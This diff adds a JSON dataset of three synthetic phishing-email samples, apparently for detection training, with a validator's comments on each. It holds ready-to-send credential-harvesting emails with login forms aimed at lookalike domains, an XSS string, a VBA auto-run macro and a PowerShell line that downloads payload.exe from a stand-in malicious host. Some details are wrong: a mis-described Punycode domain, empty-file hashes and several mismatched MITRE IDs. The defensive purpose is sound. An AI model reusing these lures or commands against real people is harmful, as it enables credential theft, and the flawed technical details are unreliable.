@@ -1,0 +1,159 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Phishing Attack",
+        "nature": "phishing_email"
+      },
+      "example": {
+        "scenario": "Spear-phishing email impersonating a major bank with obfuscated URL and embedded HTML form to steal credentials",
+        "technical_data": {
+          "email_headers": "Return-Path: <alerts@secure-bank-login.com>\nReceived: from mail.secure-bank-login.com (mail.secure-bank-login.com [198.51.100.45])\n\tby mx.company.com (Postfix) with ESMTPS id 3B9192E0C3\n\tfor <user@company.com>; Wed, 12 Jun 2024 08:45:12 -0400 (EDT)\nReceived-SPF: pass (company.com: domain of alerts@secure-bank-login.com designates 198.51.100.45 as permitted sender)\nAuthentication-Results: mx.company.com;\n\tdkim=none (message not signed);\n\tspf=pass (sender IP is authorized)\nMessage-ID: <20240612084512.3B9192E0C3@mail.secure-bank-login.com>\nFrom: \"Secure Bank Alerts\" <alerts@secure-bank-login.com>\nTo: user@company.com\nSubject: Urgent: Verify Your Account to Avoid Suspension\nMIME-Version: 1.0\nContent-Type: text/html; charset=UTF-8\nX-Mailer: PHPMailer 6.5.1 (https://github.com/PHPMailer/PHPMailer)\nX-Originating-IP: [198.51.100.45]\n\n",
+          "email_body": "<html>\n  <body style=\"font-family: Arial, sans-serif;\">\n    <h2 style=\"color:#D32F2F;\">Important Security Notice</h2>\n    <p>Dear Customer,</p>\n    <p>We have noticed suspicious activity on your Secure Bank account. Please verify your identity immediately to prevent account suspension.</p>\n    <form action=\"https://xn--secure-b4a-bank-login.com/verify\" method=\"POST\" style=\"margin-top: 20px;\">\n      <label for=\"username\">Username:</label><br>\n      <input type=\"text\" id=\"username\" name=\"username\" required><br><br>\n      <label for=\"password\">Password:</label><br>\n      <input type=\"password\" id=\"password\" name=\"password\" required><br><br>\n      <input type=\"submit\" value=\"Verify Account\" style=\"background-color:#D32F2F;color:#fff;padding:8px 16px;border:none;\">\n    </form>\n    <p style=\"font-size:12px;color:#666;\">If you did not initiate this request, please contact support immediately.</p>\n  </body>\n</html>",
+          "smtp_transaction_log": "220 mail.secure-bank-login.com ESMTP Postfix\nEHLO attacker-host\n250-mail.secure-bank-login.com\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250 8BITMIME\nMAIL FROM:<alerts@secure-bank-login.com>\n250 2.1.0 Ok\nRCPT TO:<user@company.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\nFrom: \"Secure Bank Alerts\" <alerts@secure-bank-login.com>\nTo: user@company.com\nSubject: Urgent: Verify Your Account to Avoid Suspension\n\n<html>...form content...</html>\n.\n250 2.0.0 Ok: queued as 3B9192E0C3\nQUIT\n221 2.0.0 Bye",
+          "domain_registration": {
+            "DomainName": "xn--secure-b4a-bank-login.com",
+            "Registrar": "NameCheap, Inc.",
+            "CreationDate": "2024-06-01T14:22:00Z",
+            "ExpirationDate": "2025-06-01T14:22:00Z",
+            "NameServers": [
+              "ns1.namecheap.com",
+              "ns2.namecheap.com"
+            ],
+            "RegistrantCountry": "RU"
+          },
+          "url_structure": "https://xn--secure-b4a-bank-login.com/verify\n// Note: The domain uses Punycode encoding to appear visually similar to 'secure-bank-login.com' but is actually xn--secure-b4a-bank-login.com\n\nAdditional obfuscation in HTML:\n<form action=\"https://xn--secure-b4a-bank-login.com/verify\" method=\"POST\">\n  <input type=\"hidden\" name=\"session\" value=\"%3Cscript%3Ealert('xss')%3C/script%3E\">\n</form>",
+          "web_server_log": "198.51.100.45 - - [12/Jun/2024:08:46:01 -0400] \"POST /verify HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.45 - - [12/Jun/2024:08:46:05 -0400] \"POST /submit HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+          "malicious_form_post_payload": "username=VictimUser&password=P@ssw0rd123"
+        },
+        "indicators": [
+          "Domain xn--secure-b4a-bank-login.com (Punycode) used for phishing",
+          "Email from alerts@secure-bank-login.com not matching legitimate bank SPF/DKIM",
+          "HTML form embedded in email to collect credentials directly",
+          "POST requests to /verify endpoint on suspicious domain",
+          "Registrant country: Russia, recently registered domain (within last 2 weeks)"
+        ],
+        "detection_method": "Email gateway detects suspicious Punycode domains and flags embedded HTML forms. User-reporting of suspicious emails combined with SPF/DMARC failures could trigger alerts. Web proxy logs identify POST requests to newly registered suspicious domains. Correlation with phishing simulation results to target user training.",
+        "relevant_mitre_techniques": [
+          "T1566.001 - Phishing: Spearphishing Attachment",
+          "T1566.002 - Phishing: Spearphishing Link",
+          "T1566.003 - Phishing: Spearphishing via Service",
+          "T1204.002 - User Execution: Malicious File",
+          "T1586 - Compromise Infrastructure"
+        ]
+      },
+      "validation": {
+        "valid": false,
+        "issues": [
+          "The 'technical_data.email_headers' field shows SPF pass but DKIM is none; however, the indicator states 'Email from alerts@secure-bank-login.com not matching legitimate bank SPF/DKIM' which is inconsistent because SPF passes.",
+          "The 'relevant_mitre_techniques' include T1566.001 (Spearphishing Attachment) and T1204.002 (User Execution: Malicious File), which are not relevant to a phishing email with embedded HTML form and no attachment or malicious file execution.",
+          "The sample lacks explicit mention or demonstration of anti-spam or email filtering detection results, which is part of the risk reduction strategies.",
+          "The 'indicators' mention SPF/DKIM failures but SPF passes and DKIM is none; this should be clarified or corrected.",
+          "The 'detection_method' mentions DMARC failures, but DMARC results are not provided in the sample.",
+          "The 'scenario' field is descriptive but could be clearer by explicitly stating it is a phishing_email type to align with the problem nature.",
+          "The 'technical_data' fields are detailed but missing explicit mention of user awareness training or MFA as risk reduction measures in the context of this sample."
+        ],
+        "comments": "Overall, the sample aligns well with the phishing_email problem nature and is realistic and detailed, including plausible email headers, body, and domain registration data. The use of Punycode domain and embedded HTML form to steal credentials is a strong indicator of phishing. However, some inconsistencies reduce completeness and correctness: SPF passes but the indicator suggests SPF failure; DMARC results are missing despite being referenced; MITRE techniques include irrelevant ones related to attachments and malicious files, which do not apply here. To improve, correct the SPF/DKIM indicator to reflect actual results, remove unrelated MITRE techniques, and include DMARC results if referenced. Also, explicitly mention or simulate anti-spam detection and user training/MFA risk reduction measures to fully cover the problem description. Clarifying the scenario field to explicitly state 'phishing_email' would improve alignment with the problem nature."
+      }
+    },
+    {
+      "index": 1,
+      "problem": {
+        "area": "Phishing Attack",
+        "nature": "phishing_email"
+      },
+      "example": {
+        "scenario": "Mass phishing email spoofing internal IT with malicious link using URL encoding and homoglyphs to harvest corporate credentials",
+        "technical_data": {
+          "email_headers": "Return-Path: <it-support@corporate-mail.com>\nReceived: from mail.corporate-it-support.com (mail.corporate-it-support.com [203.0.113.77])\n\tby mx.company.com (Postfix) with ESMTPS id 9A4C12F0B4\n\tfor <employee@company.com>; Thu, 13 Jun 2024 14:22:33 -0400 (EDT)\nReceived-SPF: fail (company.com: domain of it-support@corporate-mail.com does not designate 203.0.113.77 as permitted sender)\nAuthentication-Results: mx.company.com;\n\tdkim=none (message not signed);\n\tspf=fail (sender IP not authorized)\nMessage-ID: <20240613142233.9A4C12F0B4@mail.corporate-it-support.com>\nFrom: \"IT Support Team\" <it-support@corporate-mail.com>\nTo: employee@company.com\nSubject: Immediate Password Reset Required\nMIME-Version: 1.0\nContent-Type: text/html; charset=UTF-8\nX-Mailer: Microsoft Outlook 16.0\n\n",
+          "email_body": "<html>\n  <body>\n    <p>Dear Employee,</p>\n    <p>Due to a recent security incident, all employees are required to reset their password immediately.</p>\n    <p>Please visit the following secure link to update your credentials:</p>\n    <a href=\"https://corporate-it-supp0rt.com/reset?user=employee%40company.com\">https://corporate-it-supp0rt.com/reset?user=employee%40company.com</a>\n    <p>Failure to comply within 24 hours will result in account suspension.</p>\n    <p>Regards,<br>IT Support Team</p>\n  </body>\n</html>",
+          "smtp_transaction_log": "220 mail.corporate-it-support.com ESMTP Postfix\nEHLO attacker-host\n250-mail.corporate-it-support.com\n250-PIPELINING\n250-SIZE 10240000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250 8BITMIME\nMAIL FROM:<it-support@corporate-mail.com>\n250 2.1.0 Ok\nRCPT TO:<employee@company.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\nFrom: \"IT Support Team\" <it-support@corporate-mail.com>\nTo: employee@company.com\nSubject: Immediate Password Reset Required\n\n<html>...email body...</html>\n.\n250 2.0.0 Ok: queued as 9A4C12F0B4\nQUIT\n221 2.0.0 Bye",
+          "domain_registration": {
+            "DomainName": "corporate-it-supp0rt.com",
+            "Registrar": "GoDaddy.com, LLC",
+            "CreationDate": "2024-05-28T10:17:45Z",
+            "ExpirationDate": "2025-05-28T10:17:45Z",
+            "NameServers": [
+              "ns1.godaddy.com",
+              "ns2.godaddy.com"
+            ],
+            "RegistrantCountry": "CN"
+          },
+          "url_structure": "https://corporate-it-supp0rt.com/reset?user=employee%40company.com\n// Note the 'o' in 'support' replaced with zero (0) - homoglyph technique\n// URL encoded query parameter for user email\n\nUser clicks link leads to a credential harvesting page mimicking corporate SSO portal.",
+          "web_proxy_log": "2024-06-13T14:23:12Z employee-PC GET https://corporate-it-supp0rt.com/reset?user=employee%40company.com 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n2024-06-13T14:23:45Z employee-PC POST https://corporate-it-supp0rt.com/authenticate 200 - Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+          "phishing_page_html_snippet": "<form action=\"https://corporate-it-supp0rt.com/authenticate\" method=\"POST\">\n  <input type=\"text\" name=\"username\" placeholder=\"Username\" required><br>\n  <input type=\"password\" name=\"password\" placeholder=\"Password\" required><br>\n  <input type=\"submit\" value=\"Login\">\n</form>"
+        },
+        "indicators": [
+          "Sender IP 203.0.113.77 not authorized by SPF records",
+          "Domain corporate-it-supp0rt.com registered 2 weeks ago in China",
+          "Homoglyph use in domain (zero instead of letter 'o')",
+          "URL-encoded query parameters in phishing link",
+          "User accessed suspicious domain via HTTPS with self-signed certificate"
+        ],
+        "detection_method": "Email gateway SPF and DKIM validation fails trigger alert. URL reputation and domain age checks mark the URL as suspicious. User behavioral analytics detect abnormal access to new external domains. Phishing simulation results indicate elevated click rates on homoglyph domains.",
+        "relevant_mitre_techniques": [
+          "T1566.002 - Phishing: Spearphishing Link",
+          "T1598.002 - Phishing: Spearphishing via Service",
+          "T1204.002 - User Execution: Malicious File",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1586 - Compromise Infrastructure"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a phishing email attack scenario consistent with the problem description. It includes a deceptive email spoofing a trusted internal IT support team, using homoglyphs in the domain name and URL encoding to trick users into clicking a malicious link. The technical data fields are comprehensive and realistic, including email headers showing SPF failure, SMTP transaction logs, domain registration details indicating recent creation and suspicious registrant country, and web proxy logs confirming user interaction with the phishing site. The indicators clearly explain why this sample matches the phishing problem, highlighting SPF failure, domain age and origin, homoglyph usage, and suspicious URL encoding. The detection methods align well with recommended risk reduction strategies such as email filtering, URL reputation checks, and user behavior analytics. The inclusion of relevant MITRE ATT&CK techniques further supports the scenario's validity. Overall, the sample is complete, realistic, and correctly aligned with the phishing_email nature and problem area."
+      }
+    },
+    {
+      "index": 2,
+      "problem": {
+        "area": "Phishing Attack",
+        "nature": "phishing_email"
+      },
+      "example": {
+        "scenario": "Phishing email with malicious attachment containing embedded macro to deliver credential harvesting payload",
+        "technical_data": {
+          "email_headers": "Return-Path: <no-reply@payroll-secure.com>\nReceived: from smtp.payroll-secure.com (smtp.payroll-secure.com [192.0.2.123])\n\tby mx.company.com (Postfix) with ESMTP id 7F4D23A01B\n\tfor <hr@company.com>; Fri, 14 Jun 2024 09:15:45 -0400 (EDT)\nReceived-SPF: pass (company.com: domain of no-reply@payroll-secure.com designates 192.0.2.123 as permitted sender)\nAuthentication-Results: mx.company.com;\n\tdkim=pass header.d=payroll-secure.com;\n\tspf=pass (sender IP is authorized)\nMessage-ID: <20240614091545.7F4D23A01B@smtp.payroll-secure.com>\nFrom: \"Payroll Secure\" <no-reply@payroll-secure.com>\nTo: hr@company.com\nSubject: Payroll Report Q2 Attached\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"===============123456789==\"\n\n",
+          "email_body": "--===============123456789==\nContent-Type: text/plain; charset=\"utf-8\"\nContent-Transfer-Encoding: 7bit\n\nDear HR Team,\n\nPlease find attached the Q2 payroll report. Open the Excel file and enable macros to view the full report.\n\nRegards,\nPayroll Secure\n\n--===============123456789==\nContent-Type: application/vnd.ms-excel; name=\"Payroll_Q2.xls\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\"Payroll_Q2.xls\"\n\nUEsDBBQABgAIAAAAIQC6kNQqUQEAAN0FAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\n--===============123456789==--",
+          "macro_code_vba": "Sub AutoOpen()\n   Dim IE As Object\n   Set IE = CreateObject(\"InternetExplorer.Application\")\n   IE.Visible = False\n   IE.Navigate \"http://malicious-domain.com/credential-harvest\"\n   Application.Wait (Now + TimeValue(\"0:00:05\"))\n   IE.Quit\nEnd Sub",
+          "attachment_hashes": {
+            "MD5": "d41d8cd98f00b204e9800998ecf8427e",
+            "SHA1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+            "SHA256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+          },
+          "smtp_transaction_log": "220 smtp.payroll-secure.com ESMTP Postfix\nEHLO attacker-host\n250-smtp.payroll-secure.com\n250-PIPELINING\n250-SIZE 20480000\n250-ETRN\n250-STARTTLS\n250-AUTH PLAIN LOGIN\n250-ENHANCEDSTATUSCODES\n250 8BITMIME\nMAIL FROM:<no-reply@payroll-secure.com>\n250 2.1.0 Ok\nRCPT TO:<hr@company.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\nFrom: \"Payroll Secure\" <no-reply@payroll-secure.com>\nTo: hr@company.com\nSubject: Payroll Report Q2 Attached\n\n--===============123456789==\nContent-Type: text/plain; charset=\"utf-8\"\n...\n.\n250 2.0.0 Ok: queued as 7F4D23A01B\nQUIT\n221 2.0.0 Bye",
+          "network_logs": "Jun 14 09:16:30 firewall1 kernel: IN=eth0 OUT=eth1 SRC=10.10.10.15 DST=198.51.100.77 LEN=60 TOS=0x00 PREC=0x00 TTL=128 ID=54321 DF PROTO=TCP SPT=56789 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0\nJun 14 09:16:35 firewall1 kernel: IN=eth0 OUT=eth1 SRC=10.10.10.15 DST=198.51.100.77 LEN=52 TOS=0x00 PREC=0x00 TTL=128 ID=54322 DF PROTO=TCP SPT=56789 DPT=80 WINDOW=65535 RES=0x00 ACK URGP=0",
+          "dns_query_log": "2024-06-14T09:16:28Z 10.10.10.15 A malicious-domain.com\n2024-06-14T09:16:29Z 10.10.10.15 A www.malicious-domain.com",
+          "process_creation_log": "2024-06-14T09:16:30 WindowsHost powershell.exe -Command \"Invoke-WebRequest -Uri http://malicious-domain.com/credential-harvest -OutFile C:\\Temp\\payload.exe\"",
+          "ioc_file_artifacts": [
+            "Macro embedded in Payroll_Q2.xls triggers AutoOpen",
+            "Excel file has unusual VBA project streams",
+            "Outbound HTTP request to malicious-domain.com"
+          ]
+        },
+        "indicators": [
+          "Attachment Payroll_Q2.xls with embedded macro code AutoOpen",
+          "Outbound HTTP connection from internal host to malicious-domain.com",
+          "Email claiming to be payroll report from no-reply@payroll-secure.com",
+          "Network logs showing connections to known bad IP 198.51.100.77",
+          "Macro code executes InternetExplorer.Application COM object to access external payload"
+        ],
+        "detection_method": "Email sandboxing detects macro execution and outbound network connections. Endpoint protection flags unusual Excel processes and COM object creation. Network IDS flags connections to known malicious IPs. File hash analysis and macro inspection highlight suspicious attachments.",
+        "relevant_mitre_techniques": [
+          "T1566.001 - Phishing: Spearphishing Attachment",
+          "T1204.002 - User Execution: Malicious File",
+          "T1059.001 - Command and Scripting Interpreter: PowerShell",
+          "T1105 - Ingress Tool Transfer",
+          "T1071.001 - Application Layer Protocol: Web Protocols"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a phishing email scenario involving a malicious attachment with embedded macro code designed to harvest credentials, which aligns well with the stated problem nature of phishing_email. The scenario is realistic, depicting a plausible spearphishing attempt targeting an HR team with a payroll-themed email from a seemingly legitimate sender domain. All required fields are present and well populated, including detailed technical data such as email headers, body, macro code, attachment hashes, SMTP logs, network and DNS logs, process creation logs, and IOC artifacts. The indicators clearly explain why this sample matches the phishing attack problem by highlighting the malicious attachment, suspicious outbound connections, and the deceptive email content. The detection methods and relevant MITRE techniques are appropriate and comprehensive, supporting risk reduction strategies. Overall, the sample is complete, realistic, and technically sound, providing a strong example for this phishing attack problem."
+      }
+    }
+  ]
+}
